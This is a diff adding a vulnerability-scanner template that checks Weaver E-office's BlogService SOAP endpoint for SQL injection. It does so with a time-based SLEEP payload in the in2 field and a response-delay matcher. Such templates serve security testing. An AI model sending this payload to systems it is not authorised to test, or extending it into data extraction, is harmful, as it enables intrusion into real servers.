@@ -1,0 +1,45 @@
+id: weaver-eoffice-blogservice-sqli
+
+info:
+  name: 泛微 E-office BlogService - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: 
+  tags: weaver,sqli,oa,eoffice,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /services/BlogService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+        Connection: close
+        Content-Type: text/xml;charset=UTF-8
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip, deflate
+        
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <web:sendSubmitRemind>
+        <!--type: string-->
+        <web:in0>1</web:in0>
+        <!--type: string-->
+        <web:in1>2</web:in1>
+        <!--type: string-->
+        <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(6)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
+        </web:sendSubmitRemind>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+        condition: and
